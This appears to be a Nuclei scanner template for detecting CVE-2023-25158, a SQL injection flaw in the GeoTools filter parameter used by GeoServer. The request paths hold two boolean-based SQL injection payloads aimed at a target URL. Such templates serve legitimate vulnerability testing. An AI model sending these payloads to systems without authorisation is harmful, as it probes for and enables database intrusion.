id: geotools-sqli-cve-2023-25158

info:
  name: GeoTools â€“ SQL Injection Detection (CVE-2023-25158)
  author: lau90eth
  severity: high
  description: |
    GeoTools (commonly used by GeoServer) is vulnerable to a SQL Injection issue in the
    `filter` parameter. This template performs a safe boolean-based detection using two
    differential SQL payloads.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-25158
  tags: geotools, geoserver, sqli, cve, injection

requests:
  - method: GET
    req-condition: true
    path:
      - "{{BaseURL}}/geoserver/web/?filter=1'%20OR%201=1--"
      - "{{BaseURL}}/geoserver/web/?filter=1'%20AND%201=2--"

    matchers-condition: and

    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "GeoServer"
          - "GeoTools"
